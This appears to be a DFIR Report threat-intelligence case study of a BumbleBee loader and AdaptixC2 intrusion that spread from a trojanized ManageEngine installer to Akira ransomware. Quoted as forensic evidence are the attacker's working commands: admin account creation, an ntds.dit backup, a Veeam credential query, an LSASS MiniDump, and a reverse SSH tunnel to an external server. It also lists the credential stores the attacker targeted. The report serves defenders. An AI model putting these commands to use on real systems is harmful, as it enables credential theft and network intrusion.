---
title: "From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira - The DFIR Report"
source_url: "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
published: "2026-06-29T13:07:17+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2026-06-29_from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3.html"
---

# From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira - The DFIR Report
## Key Takeaways

- In July 2025, BumbleBee malware was deployed via SEO poisoning through a trojanized installer for ManageEngine OpManager.

- Following initial access, BumbleBee dropped an AdaptixC2 beacon to facilitate further intrusion activities, allowing the threat actor to pivot to a domain controller and dump the NTDS.dit.

- The threat actor returned the following day and established an SSH proxy, enabling lateral movement across the network and data exfiltration via FileZilla and SFTP to an external server.

- The threat actor concluded the intrusion by deploying Akira ransomware across the root domain and returned two days later to encrypt a child domain.

This case was first reported to customers in a threat brief released in July 2025 and in a public flash alert in August 2025 in partnership with Swisscom B2B CSIRT , which observed another intrusion tied to the same campaign. This report contains data from both intrusions. We plan to release a DFIR Labs case based on this report later this quarter.

## Case Summary

The BumbleBee intrusion was initiated in July 2025 via an SEO poisoning attack that lured a user searching for “ManageEngine OpManager” to a look-alike domain. Upon downloading a trojanized MSI installer, the BumbleBee first-stage loader (msimg32.dll) was executed on a beachhead host via DLL side-loading. The loader immediately established command-and-control (C2) communication with threat actor-controlled infrastructure.

Approximately five hours after the initial infection, the threat actor deployed AdgNsy.exe, a renamed instance of the legitimate Windows Address Book utility, which was injected with AdaptixC2 shellcode. This established a persistent C2 channel, enabling the threat actor to perform living-off-the-land discovery commands such as systeminfo and nltest to map the internal network. To ensure persistence, the threat actor created new domain accounts with Enterprise Admin privileges and installed RustDesk as a Windows service on multiple servers.

On the second and third days, the threat actor moved laterally using RDP to pivot to a domain controller and a backup server. They engaged in extensive credential harvesting, utilizing wbadmin.exe to extract the NTDS.dit Active Directory database and executing custom PowerShell scripts to dump and decrypt Veeam credentials via DPAPI. The threat actor also employed the lsassy utility to dump LSASS memory across multiple hosts.

Throughout the intrusion, the threat actor leveraged defense evasion and tunneling techniques. This included using a reverse SSH tunnel to proxy RDP traffic and bypass firewall restrictions, as well as employing mixed-case command-line obfuscation (e.g., pOWerShELl.exE ). In a parallel incident, they even used a Bring Your Own Vulnerable Driver (BYOVD) attack to neutralize endpoint security controls.

Data exfiltration was primarily facilitated through FileZilla, which the threat actor likely introduced into the environment via RDP clipboard. Over 75GB of data, including file shares, sensitive user credentials, and SYSVOL domain configurations were exfiltrated to an threat actor controlled server in Ukraine. The intrusion culminated approximately 44 hours after initial access with the deployment of Akira ransomware (staged as locker.exe ), which used WMI to delete Volume Shadow Copies and maximize impact across the infrastructure.

If you would like to get an email when we publish a new report, please subscribe here .

## The DFIR Report Offerings

Check out our Products here and our Services here . Want a demo, more information on our services, pricing or just want to chat? Get in Touch

## Analysts

Analysis and reporting completed by Jake , Dino , Ahmed Farouk & Mattison Schuch . Reviewed by Angelo Violetti & Renzon Cruz

## Initial Access

The BumbleBee intrusion was initiated in July 2025 via a SEO poisoning attack. A user searching Bing for “ManageEngine OpManager”, a network monitoring suite, was lured to opmanager[.]pro , a sophisticated lookalike domain. This site served a cloned interface that redirected the victim to download-center[.]online , ultimately delivering a trojanized MSI installer instead of the legitimate software.

Forensic analysis of the browser history mapped the sequence of redirects leading to the malicious host.

The victim subsequently moved the malicious MSI to an internal network share; from there, an IT administrator executed the file on the beachhead host.

Delivery Infrastructure

This intrusion aligns with a broader BumbleBee SEO poisoning campaign that Cyjax first identified in May 2025. The operation utilized a standardized, two-tier delivery architecture:

- Tier 1: Impersonation Front-ends – Malvertising domains (e.g., opmanager[.]pro , zenmap[.]pro ) that appeared in Bing search results. These sites served high-fidelity clones of legitimate download pages to establish trust.

- Tier 2: Universal Delivery Gateways – Backend servers hosting trojanized MSI installers. By using a uniform URL parameter ( /Get?q=<toolname> ), the same infrastructure could dynamically serve various malicious packages. This pattern is a reliable pivot point for researchers on platforms like urlscan.io .

Two separate waves of activity were observed, masquerading as various enterprise software suites to facilitate BumbleBee infections.

|  | Wave 1 (May 2025) | Wave 2 (July 2025)

| Tools Targeted | WinMTR, Zenmap, RVTools, Milestone XProtect | ManageEngine OpManager, Advanced IP Scanner, MIB Browser

| Download Gateways | download-server[.]online , soft-server[.]online | download-center[.]online , soft-hub[.]pro

| DLL Sideloading | icardagt.exe → version.dll dropped in “ApplicationInstallationFolder_11” | consent.exe → msimg32.dll dropped in “ApplicationInstallationFolder_11”

| DGA Pattern | 13-char .life | 14-char .org

| MSI Signers | LLC Ellada Comfort, LLC Best Consult, LLC Vector | LLC Resource+, LLC Ugurmana, LLC Leighton, LLC Vector

| Sample | https://tria.ge/250530-ttmjhayzhw | https://tria.ge/250812-zw4tfszpy4

Technical analysis revealed significant infrastructure overlap across both waves: all download gateways resolved to Hostinger (AS47583) and utilized a shared code-signing certificate issued to “LLC Vector.”

Potentially Related Campaign

In October 2025, Zscaler documented a parallel campaign targeting user searching for Ivanti VPN. This operation used SEO poisoning to lure victims to a fraudulent download page, delivering a trojanized MSI designed to exfiltrate saved VPN credentials. This campaign exhibited a near-identical tactical fingerprint to the BumbleBee waves, specifically:

- Delivery Mechanics: A consistent two-tier model leveraging Bing SEO poisoning and the specific /Get?q= URL parameter.

- Infrastructure Overlap: Passive DNS analysis confirms that the Ivanti gateways ( netml[.]shop , shopping5[.]shop ) utilized the same Hostinger staging IP (84.32.84.32) as the Wave 1 gateway, soft-server[.]online .

- Naming Conventions: The Ivanti campaign employed the same ftp. subdomain pattern observed throughout Wave 2.

Despite the infrastructure overlap, several key operational divergences distinguish this activity from the BumbleBee waves:

- Payload: The campaign distributed a dedicated VPN credential stealer rather than the BumbleBee loader.

- Signature Attribution: The MSI is signed by a Chinese entity (Hefei Qiangwei Network Technology), deviating from the Russian-based “LLCs” observed in previous waves.

- C2 Architecture: Upon execution, the stealer beaconed to a hardcoded Azure IP ( 4.239.95[.]1:8080 ), bypassing the Domain Generation Algorithm (DGA) infrastructure characteristic of BumbleBee Waves 1 and 2.

Swisscom

The Swisscom linked BumbleBee intrusion originated from a management server, where an IT administrator navigated to ip-scanner[.]org . This impersonation site masqueraded as the official Advanced IP Scanner portal to lure users into downloading a malicious payload. Although the site content had changed by the time of analysis, forensic inspection of the DOM tree revealed residual strings and metadata explicitly tied to Advanced IP Scanner, confirming its previous role as a deceptive lookalike domain.

## Execution

BumbleBee – ManageEngine-OpManager.msi

After copying the malicious MSI from the network share to a server, the infection started with the execution of ManageEngine-OpManager.msi from the user’s desktop. Forensic telemetry confirmed explorer.exe as the parent process, validating that the file was manually launched by the user. This successful initial access was the direct result of the threat actor’s masquerading tactics, which effectively leveraged a high-fidelity decoy to deceive the administrator into authorizing the installation.

The choice to impersonate a ManageEngine installer indicates a deliberate effort to target high-value users, such as IT staff and System Administrators. These accounts typically possess elevated privileges and are often subject to fewer restrictions than standard user profiles. Furthermore, targeting these roles increases the likelihood of execution on critical infrastructure, including file servers and domain controllers.

Technical analysis of the ManageEngine-OpManager.msi payload revealed a revoked code-signing certificate issued to “LLC Resource+.”

Tracking provided by certgraveyard.org shows that this signer has a history of signing BumbleBee-related malware.

The ManageEngine-OpManager.msi installer dropped three distinct binaries into %TEMP%\ApplicationInstallationFolder_11 . This setup was designed to facilitate DLL side-loading:

- ManageEngine_OpManager_64bit.exe : The legitimate software used as a decoy to avoid user suspicion.

- consent.exe : A legitimate Windows binary leveraged to initiate the execution chain.

- msimg32.dll : The BumbleBee first-stage loader, which is automatically loaded by the legitimate process to bypass security detections.

Interestingly, the metadata of msimg32d.dll is dictionary-derived gibberish, which is a known BumbleBee builder pattern across waves. They are extremely useful as a YARA signature because the strings collide essentially nowhere in benign software.

consent.exe and DLL Side-Loading

The ManageEngine-OpManager.msi functioned as a dual-purpose installer. While it deployed the authentic OpManager software to satisfy user expectations, it simultaneously stages a DLL side-loading attack within the %APPDATA% directory. By placing a legitimate, signed Windows binary ( consent.exe ) in the same folder as a malicious msimg32.dll , the threat actor exploits the Windows DLL search order.

When the staged consent.exe was executed, it prioritized loading the local, malicious msimg32.dll over the legitimate version residing in C:\Windows\System32 . This allowed the BumbleBee loader to run within the memory space of a trusted Windows process, effectively masking its presence from many signature-based security tools.

Analysis provided by tria.ge showed that consent.exe and the legitimate OpManager installer were dropped and executed by the malicious MSI.

The Sigma rule System File Execution Location Anomaly was triggered since it looks for execution of commonly abused Windows built-in binaries (consent.exe) outside of their normal path; in this case, the binary executed from the victim’s AppData folder.

Upon execution, consent.exe loaded the malicious msimg32.dll (the BumbleBee loader). The loader immediately checked the system locale GetSystemDefaultLocaleName() and compared it against a hard-coded list of 27 CIS-region locales (Russia, Ukraine, Belarus, etc.). If a match was found, the loader terminated via ExitProcess() .

If the loader passed the geofencing check, it began querying numerous dynamically generated domain names associated with the BumbleBee malware family.

Swisscomm – Bumblebee

In the Swisscom intrusion, the user downloaded Advanced-IP-Scanner.msi directly to a management server. This installer functioned as a malicious wrapper. It successfully deployed the legitimate Advanced IP Scanner software to avoid raising suspicion while simultaneously dropping the BumbleBee loader. Following the MSI’s execution, the malware staged additional artifacts in the %TEMP% directory, establishing the initial foothold on the server while the administrator proceeded with the expected utility.

The malicious payload was staged immediately after the user granted administrative privileges via the User Account Control (UAC) prompt.

Static analysis of the BumbleBee DLL ( msimg32 ) revealed several anomalous strings within its PE metadata. Specifically, the ‘Original Filename’ and ‘Description’ fields contained values inconsistent with the legitimate Windows library, serving as a key indicator of its malicious nature.

Furthermore, the digital signature on the msimg32 DLL was traced to a certificate issued to a Russian-based entity. This mirrored the signing patterns observed in previous BumbleBee waves, suggesting a consistent supply chain for their malicious binaries.

Adaptix C2- AdgNsy.exe

Following the initial BumbleBee beacon, the loader retrieved and executed AdgNsy.exe . Forensic analysis identified this file as a renamed instance of the legitimate WAB.exe (Windows Address Book) utility. The attack used this binary for process injection: the loader executed the masqueraded WAB.exe and injected it with Adaptix shellcode. This resulted in an active Adaptix C2 HTTP beacon that, in this instance, utilized default configuration settings for its communication profile. Deeper analysis of this activity is covered in the Defense Evasion section.
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
OriginalFileName: WAB.EXE
CommandLine: C:\Users\<redacted>\AppData\Local\AdgNsy.exe

Following the establishment of the C2 channel, the threat actor initiated discovery and enumeration activities. Analysis of the process telemetry revealed a series of living-off-the-land commands used to map the environment:

- Host/User Discovery: whoami , systeminfo , quser

- Domain/Network Reconnaissance: nltest , ping

Furthermore, they leveraged the beacon for internal network scanning, signaling the start of lateral movement preparation within the victim infrastructure.

Swisscom – Adaptix C2

In the Swisscom incident, a 40-minute dwell time preceded the deployment of an Adaptix C2 agent. The loader dropped an authentic version of the Windows Contacts utility into a user-writable folder to facilitate process injection. This mechanism was used to execute Adaptix C2 shellcode, initiating an outbound connection to 170.130.55[.]223 .

## Persistence

Domain Account Creation

On the initial day of the intrusion, the threat actor moved to establish persistent administrative access by creating two new domain accounts via net.exe . The account names backup_DA and backup_EA were likely chosen to blend in with legitimate administrative naming conventions:
net user backup_DA P@ssw0rd1234 /add /dom net user backup_EA P@ssw0rd1234 /add /dom
Following creation, the threat actor immediately performed privilege escalation by adding the backup_EA account to the Enterprise Admins group, granting them the highest level of authority across the entire Active Directory forest:
net group "enterprise admins" backup_EA /add /dom
Services

Following the initial compromise, the threat actor used RDP to pivot to two internal servers. The objective was to install RustDesk, which was subsequently registered as a Windows service.

Administrator Account Manipulation

On the second day of the intrusion, the threat actor engaged in account takeover across high-value assets. By executing net user administrator P@ssw0rd! , they established direct control over local administrative contexts on the file and backup servers. The operation culminated in the reactivation of the built-in Domain Administrator account on the primary domain controller.

### Swisscom

In the Swisscom observed intrusion, the threat actor achieved persistence on a domain controller by installing the Cloudflare tunneling software as a Windows service, causing it to run automatically after the host rebooted. Cloudflared has multiple capabilities that are useful for threat actors:

- Bypasses firewalls and NAT by initiating outbound connections.

- Encrypts traffic using HTTPS, making inspection more difficult.

- Avoids the need for port forwarding by using reverse tunneling.

- Routes the traffic through Cloudflare, which appears legitimate and can evade detection.

- Requires minimal configuration and is easy to deploy.

The installation was performed through a PowerShell script called 1.ps1, which downloaded the software and registered a new service for it.

Based on the comments in the script and the strings output in the PowerShell console, it is likely that 1.ps1 was developed with generative AI tools.

## Privilege Escalation

There were a limited number of privilege escalation techniques observed during this incident due to the threat actor obtaining a privileged session by compromising a domain admin in the first instance.

## Defense Evasion

DLL Sideloading

The BumbleBee loader established its initial foothold via DLL search order hijacking. The threat actor staged a malicious msimg32.dll file in a user-writable directory alongside a relocated copy of consent.exe (the legitimate Windows UAC binary). Upon execution of consent.exe , the operating system prioritized the local, malicious DLL over the authentic version in System32 , triggering the loader’s execution. This hijacked execution flow was corroborated by Sysmon event logs, which captured the anomalous process creation and image loading.

Static analysis using PEStudio confirmed that msimg32.dll is a legitimate, expected dependency of the consent.exe binary. The threat actor exploited this imported dependency to facilitate DLL side-loading.

Process Injection

The deployment of the Adaptix C2 agent was orchestrated through a multi-stage execution chain. The BumbleBee-controlled consent.exe process first dropped AdgNsy.exe to the local disk. The threat actor initiated execution via Windows Management Instrumentation (WMI). By using WMI to launch the binary, the threat actor ensured that AdgNsy.exe spawned under WmiPrvSE.exe .

Immediately following execution, Sysmon Event ID 10 (ProcessAccess) recorded the BumbleBee-controlled consent.exe gaining a handle on the AdgNsy.exe process. The associated call trace provided critical evidence of process injection by revealing the specific memory addresses and API calls, such as ntdll.dll and kernelbase.dll leveraged by the loader to reflectively inject the Adaptix shellcode into the trusted process.
C:\Windows\SYSTEM32\ntdll.dll+9f3b4|C:\Windows\System32\KERNELBASE.dll+2aafe|C:\Windows\System32\hasherezade_pussy.dll+1ae8f|C:\Windows\System32\hasherezade_pussy.dll+1aee8|C:\Windows\System32\hasherezade_pussy.dll+baca|C:\Windows\System32\hasherezade_pussy.dll+1214d|C:\Windows\System32\hasherezade_pussy.dll+12292d|C:\Windows\System32\KERNEL32.DLL+14ed0|C:\Windows\SYSTEM32\ntdll.dll+7e39b
Memory analysis of the AdgNsy.exe process confirmed the presence of unbacked execution. Analysts identified a thread whose entry point originated outside of the known binary’s image space, an indicator of shellcode execution. Furthermore, the discovery of multiple private, non-image regions with Read/Write/Execute (RWX) protections provides conclusive evidence of injected code residing in memory.

Scanning the memory of the hijacked AdgNsy.exe process revealed active C2 configuration strings and beaconing artifacts. Because these artifacts were not found during a static analysis of the AdgNsy.exe file, it is clear that the malicious code was injected post-execution.

To further support these findings, consent.exe was executed alongside the malicious BumbleBee msimg32.dll via DLL sideloading in a controlled analysis environment, consistent with the observed execution behavior. During runtime, the memory analysis tool PE-sieve , developed by the malware analyst hasherezade, was executed against the live consent.exe process. This resulted in the identification and extraction of an anomalous, unmapped in-memory module dumped as hasherezade_pussy.dll . This module corresponds to the same DLL referenced in the previously observed Sysmon call trace.

Subsequent analysis of hasherezade_pussy.dll indicated that it contained functionality related to environment and virtualization checks, encrypted payload handling, and process injection. Strings within the module reference multiple Win32 and NTAPI functions commonly used for process injection, supporting the hypothesis that shellcode was injected into AdgNsy.exe .

File Deletion

Forensic analysis of host telemetry revealed a pattern of secure file deletions intended to minimize the attack’s local footprint. By monitoring Sysmon Event ID 23, we identified the precise timestamps and file paths of the components removed by the threat actor, including the initial loaders and reconnaissance logs.

Case variation in command execution

The threat actor utilized command-line obfuscation by employing inconsistent, mixed-case strings for process execution. Invocations such as CmD.eXe and pOWerShELl.exE were likely used to evade case-sensitive detection signatures or rudimentary pattern-matching rules within security monitoring tools.

### Swisscom

In the Swisscom incident, the threat actor attempted to neutralize endpoint security controls by employing a Bring Your Own Vulnerable Driver (BYOVD) attack. They deployed three potentially malicious or known-vulnerable drivers to the %TEMP% directory and registered them as new system services to gain kernel-level privileges:
Service: mgdsrv | Path: ...\AppData\Local\Temp\rwdrv.sys Service: KMHLPSVC | Path: ...\AppData\Local\Temp\hlpdrv.sys
Forensic evidence from the RecentApps registry artifact suggested these drivers were managed by high-confidence “AV-killer” utilities. Although the executables were deleted prior to acquisition, the GUI execution history tracked the following paths:
C:\ProgramData\av_kill_new\icardagt\icardagt.exe
C:\ProgramData\av_kill_old\mfpmp\mfpmp.exe

## Credential Access

NTDS.dit

On the second day, the threat actor utilized the high-privilege backup_EA account to access a domain controller via RDP. The objective was to perform offline credential harvesting by extracting the Active Directory database ( ntds.dit ).

Using the native Windows utility wbadmin.exe , the threat actor created a volume shadow copy backup containing the ntds.dit file and the SYSTEM and SECURITY registry hives. These files were staged in C:\ProgramData , providing the threat actor with all the necessary components to crack domain-wide password hashes offline.
wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet
Following the backup, they were observed using Notepad to review the backup logs, likely verifying the integrity of the stolen data before exfiltration.

Following this activity, the threat actor rotated between nine different accounts while conducting their operation.

Veeam Credential Dump

Despite already having domain admin privileges, the threat actor extracted the credentials stored in the Veeam PostgreSQL database present in the backup server. The query was executed four different times from two accounts:

- Interactive Access: Three queries were performed via RDP sessions, suggesting manual verification of the credentials.

- Automated Extraction: A final query was executed remotely via WMI, utilizing an encoded PowerShell script to invoke the psql.exe utility.

C:\Program Files\PostgreSQL\15\bin\psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
The WMI-based execution was spawned via WmiPrvSE.exe and used an encoded PowerShell command.
ParentImage: WmiPrvSE.exe Image: C:\Windows\System32\cmd.exe CommandLine: cmd.exe /Q /c powershell.exe -e JABQAG8AcwB0AGcAcgB1AFMAcQBsAEUAeABlAB1AGMAIAAa9ACAA...

The decoded script extracted the credentials and decrypted them using DPAPI, by handling both legacy Veeam password storage and newer versions using a hard-coded salt value.

### Remote LSASS Memory Dump

On day three, the threat actor targeted three hosts for LSASS memory dumping using the comsvcs.dll MiniDump technique. The threat actor used an automated toolset to cycle through four distinct remote execution methods per host in rapid succession (approximately 50 seconds total):

- SMB: Service creation via svcctl .

- WMI: Remote process invocation.

- Scheduled Tasks: Remote task registration and triggering.

- DCOM: Lateral movement via the MMC20.Application object.

Image: C:\Windows\System32\rundll32.exe CommandLine: rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full
The memory dumps were staged in \Windows\Temp using randomized filenames and deceptive extensions. The specific filenames observed across the targeted hosts were G7wO.sys , U8Vfsh.docx , and AsaZQZDJz.avhdx .

This behavior is a high-confidence match for the lsassy credential dumping utility. The tool’s IDumpMethod base class defaults to the exact sequential execution order observed in this incident: smb , wmi , task , then mmc . Furthermore, the observed extensions correspond directly to lsassy ‘s hardcoded randomization list, and the use of \Windows\Temp aligns with the tool’s default staging directory.

Under the hood, lsassy leverages the Impacket library for remote orchestration. The four observed execution methods correspond directly to specific Impacket modules:

- smbexec.py : Facilitates SMB service creation.

- wmiexec.py : Manages WMI remoting.

- atexec.py : Handles remote scheduled task registration.

- mmcexec.py : Executes via DCOM.

Detailed forensic artifacts and detection strategies for these specific techniques are documented in SnapAttack ’s technical analysis.

## Discovery

Approximately five hours after initial access, the AdaptixC2 process (AdgNsy.exe) was executed on the beachhead host after which the threat actor performed hands‑on‑keyboard discovery.
/c systeminfo /c nltest /dclist: /c whoami /groups /c nltest /domain_trusts /c nltest /dclist:REDACTED.lan /c ping -n 1 REDACTED.lan /c ping -n 1 REDACTED.lan (...) /c ping -n 1 REDACTED.lan /c ping -n 1 REDACTED.lan
Shortly afterwards, a network scan was initiated from the AdgNsy.exe process, targeting common ports such as SMB, RDP and LDAP.

The threat actor then executed more system and network discovery commands on the beachhead.
/c quser /server:REDACTED.lan /c quser /server:REDACTED.lan /c dir C:\\programdata /c dir C:\\\\programdata /c nltest /dclist: /c nltest /domain_trusts /c nltest /dclist:REDACTED.lan /c net group domain admins /dom /c net group "domain admins" /dom /c whoami /groups /c ping -n 1 REDACTED.lan
On day two of the intrusion, the threat actor established an RDP session to a domain controller using a newly created user and performed further discovery.
systeminfo C:\Windows\system32\NOTEPAD.EXE C:\Windows\Logs\WindowsServerBackup\Backup-REDACTED.log net user adminiatrstor net user administrator net group domain admins /dom
Approximately 30 minutes later, the threat actor initiated RDP sessions to two additional servers and queried the local administrator account on each using the command
net user administrator
On day three of the intrusion, the threat actor again logged into the domain controller, executed discovery commands, and then dropped a SoftPerfect Network Scanner binary (n.exe), which was executed to perform a network scan.
ping -n 1 REDACTED.lan ping -n 1 REDACTED.lan quser
The execution of SoftPerfect Netscan can be confirmed by both the SMB traffic as well as the creation of the file delete.me, which the tool does when testing a folder’s write-ability.

After running the network scanner, the threat actor connected to a file server via RDP and ran a couple of discovery commands.
systeminfo net user administrator
Shortly after, they connected to a backup server using RDP and executed more discovery commands:
net user administrator net group net user C:\Windows\system32\taskmgr.exe /4 quser net localgroup net localusers net localuser net localgroup administrators net accounts
Returning to the domain controller, the threat actor enabled the domain administrator account and enumerated group memberships.
net user administrator /active:yes /dom net group net group REDACTED /dom
Approximately 40 minutes later, a PowerShell script was executed on the domain controller to enumerate Service Principal Names (SPNs) for specific services, resolve their hostnames to IP addresses, and write the result to spn.txt . The output was reviewed manually using Notepad.

Shortly after, Invoke-Sharefinder was executed to enumerate accessible SMB shares. Invoke-ShareFinder is a reconnaissance utility designed to enumerate accessible network file shares (SMB) across a domain. It was originally developed as part of the PowerView module within the PowerSploit framework, but has since been integrated into numerous offensive projects.
Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\programdata\shares.txt
On day five, two days later, the same command was re-executed on the domain controller, with the results manually inspected via Notepad. Subsequently, the threat actor leveraged an RDP session from a RustDesk host to pivot to a child domain controller. Upon gaining access, the threat actor initiated a fresh phase of discovery, primarily utilizing native system utilities to map the new environment.
"C:\Windows\system32\taskmgr.exe" /4 systeminfo
Following that, the threat actor leveraged PowerShell to enumerate domain computers and user objects, query and export DNS zone data from a domain controller, identify accessible SMB shares, and run the same SPN enumeration script observed earlier in the intrusion.
Get-ADComputer -Server 10.REDACTED -Filter * -Property * | Select-Object Enabled, Name, DNSHostName, IPv4Address, OperatingSystem, Description, CanonicalName, servicePrincipalName, LastLogonDate, whenChanged, whenCreated | export-csv -path C:\ProgramData\AdComputers.csv Get-ADUser -Server 10.REDACTED -Filter * -Properties * | Select-Object Enabled, CanonicalName, CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created, Modified, PasswordLastSet, LastLogonDate, logonCount, Department, telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail, HomeDirectory, homeMDB | export-csv -path C:\ProgramData\AdUsers.csv Get-DnsServerZone -ComputerName REDACTED.lan Export-DnsServerZone -Name "REDACTED.lan" -FileName "REDACTED.txt" Export-DnsServerZone -Name "REDACTED.lan" -FileName "REDACTED.lan.txt" Export-DnsServerZone -Name "TrustAnchors" -FileName "TrustAnchors.txt" Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\programdata\shares.txt
The outputs from these discovery activities were manually reviewed.

The threat actor then dropped and executed a SoftPerfect Network Scanner binary (n.exe) on the child domain controller to perform a network scan. Finally, additional net commands and pings were issued to validate connectivity and enumerate backup and file servers.

## Lateral Movement

The primary vector for lateral movement was native Windows RDP, used both through standard application access and SSH RDP tunneling.

By leveraging the elevated backup_EA account, the threat actor successfully accessed nearly every available RDP instance in the environment. While they eventually rotated through several compromised domain accounts to maintain mobility, the pivotal initial pivot was established from the beachhead host to the Domain Controller using the backup_EA credentials.

Forensic evidence showed the creation of a reverse SSH tunnel, a tactic used to expose internal RDP sessions to an threat actor-controlled external server:
ssh [email protected] [.]150 -R *:10400 -p22
- ssh [email protected] [.]150 : Established a session with the threat actor’s remote C2 server.

- -R *:10400 : Configured a reverse port forward. This binded port 10400 on the remote server to an internal resource. The wildcard ( * ) ensured the tunnel listened on all remote interfaces, facilitating external access.

- -p22 : Specified the standard SSH port for the connection.

Subsequent logs confirmed a successful connection bridge to the local RDP port (3389) via ssh.exe , effectively bypassing firewall restrictions to provide the threat actor with direct GUI access to the internal network.

While performing authentication through this tunnel, we observed the following workstation names from the threat actor:

- WORK

- kali

### Swisscom

Leveraging a compromised Domain Admin account, the threat actor performed lateral movement to the domain controller and various servers using multiple protocols, primarily RDP.

The RDP sessions were established via a Cloudflare tunnel, which effectively obfuscated the threat actor’s origin. This was confirmed by Windows Event Logs (EVTX), which recorded connections originating from the local loopback address ( ::%16777216 ) or known threat actor-controlled servers. This specific IP artifact is a sign of RDP tunneling, as the connection is proxied through a local process rather than a remote network address. The following workstation names were identified as associated with the threat actor’s activity:

- DESKTOP-HPLM2TD

- DESKTOP-KLKBBTS

- SERVER

- kali

## Collection

Multiple collection artifacts were observed throughout the incident. The threat actor used a combination of legitimate Windows utilities, well-known PowerShell modules such as Invoke-ShareFinder , and prebuilt collection scripts to compile and collect data on the environment.

Automated Collection Scanning

Automated scanning was observed that appeared to target typical credential and config data stores. This activity directly preceded installation and execution of FileZilla, so it is possible this data was the primary focus for exfiltration.

Network share access logs (Event ID 5145) captured the threat actor systematically checking for credential and data storage in the following locations. Note that Event ID 5145 logs access attempts whether or not the target path exists, so this represents the threat actor’s enumeration efforts rather than confirmation that all directories were present:

Credential Theft:
Users\\Administrator\\AppData\\Roaming\\Microsoft\\Protect\\ (DPAPI master keys) Users\\Administrator\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\ (RSA private keys) Users\\Administrator\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\ (User certificates) Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\ (Windows Credential Manager) Users\\Administrator\\AppData\\Roaming\\Microsoft\\Credentials\\ (Windows Credential Manager)
Browser Data (Passwords, Cookies, Autofill):
Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\ Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\ Users\\Administrator\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\ Users\\Administrator\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\
Cloud Platform Credentials:
Users\\Administrator\\.aws\\ (AWS credentials) Users\\Administrator\\AppData\\Roaming\\gcloud\\ (Google Cloud credentials) Users\\Administrator\\AppData\\Roaming\\Windows Azure Powershell\\ (Azure credentials) Users\\Administrator\\.azure\\ (Azure CLI credentials)
Password Manager Applications:
Users\\Administrator\\AppData\\Local\\1Password\\ Users\\Administrator\\AppData\\Local\\LastPass\\ Users\\Administrator\\AppData\\Local\\KeePass\\ Users\\Administrator\\AppData\\Roaming\\Dashlane\\ Users\\Administrator\\AppData\\Local\\Bitwarden\\ Users\\Administrator\\AppData\\Local\\RoboForm\\ Users\\Administrator\\AppData\\Local\\StickyPassword\\ Users\\Administrator\\AppData\\Local\\NordPass\\ Users\\Administrator\\AppData\\Local\\Enpass\\
Development/Source Code Directories:
Users\\Administrator\\source\\repos\\ Users\\Administrator\\workspace\\ Users\\Administrator\\IdeaProjects\\ Users\\Administrator\\PycharmProjects\\ Users\\Administrator\\AndroidStudioProjects\\ Users\\Administrator\\Documents\\NetBeansProjects\\ Users\\Administrator\\Documents\\Xcode\\ Users\\Administrator\\CLionProjects\\ Users\\Administrator\\RubyMineProjects\\ Users\\Administrator\\Documents\\Qt\\ Users\\Administrator\\Documents\\CodeBlocks\\ Users\\Administrator\\RiderProjects\\ Users\\Administrator\\PhpStormProjects\\
Remote Access Tool:
Users\\Administrator\\AppData\\Local\\mRemoteNG\\ (settings and connection configs) Users\\Administrator\\AppData\\Roaming\\mRemoteNG\\ (settings and connection configs)
Other:
Users\\Administrator\\AppData\\Roaming\\Notepad++\\backup\\
These were all identified by reviewing 5145 events on the file server.

## Command and Control

The threat actor used BumbleBee, AdaptixC2 and RustDesk, in addition to a reverse SSH tunnel to establish connections to their C2 infrastructure.

BumbleBee

Immediately upon execution, the BumbleBee process attempted to connect to multiple DGA-generated domains. While several failed to resolve, successful connections were established with 188.40.187[.]145:443 and 109.205.195[.]211:443 using the domains ev2sirbd269o5j[.]org and 2rxyt9urhq0bgj[.]org respectively.

The BumbleBee configuration was extracted from Tria.ge and verified through analysis of the running process and host artifacts. Throughout the intrusion, the malware persistently attempted connections to DGA domains identified in the configuration, eventually establishing communication with additional IP addresses, including 171.22.183[.]43 .

Approximately five hours post-initial execution, BumbleBee dropped AdgNsy.exe, which used code injection to initialize AdaptixC2 on the beachhead host. A concurrent spike in network traffic between the BumbleBee process and 109.205.195[.]211 indicates that this IP facilitated the payload download.

AdaptixC2

AdaptixC2 is a relatively new open-source post-exploitation and adversarial emulation framework. Although originally designed for legitimate penetration testing, it is increasingly being leveraged by threat actors in malicious campaigns. Further technical details on the framework are available in this Unit42 analysis .

The AdaptixC2 beacon, delivered via AdgNsy.exe on the beachhead host, maintained persistent command-and-control (C2) communication with 172.96.137[.]160 throughout the intrusion. Notably, there was a cessation of activity between days three and five, during which no beaconing was observed. The following graph illustrates the AdaptixC2 traffic patterns over the course of the intrusion.

The IP address 172.96.137[.]160 was hosted by Shock Hosting.

We were able to extract the configuration of the AdaptixC2 beacon, which validated the host artifacts discovered on the beachhead host.

RustDesk

On the second day, RustDesk was installed on two Windows servers and executed in system tray mode.
"C:\Program Files\RustDesk\RustDesk.exe" --tray
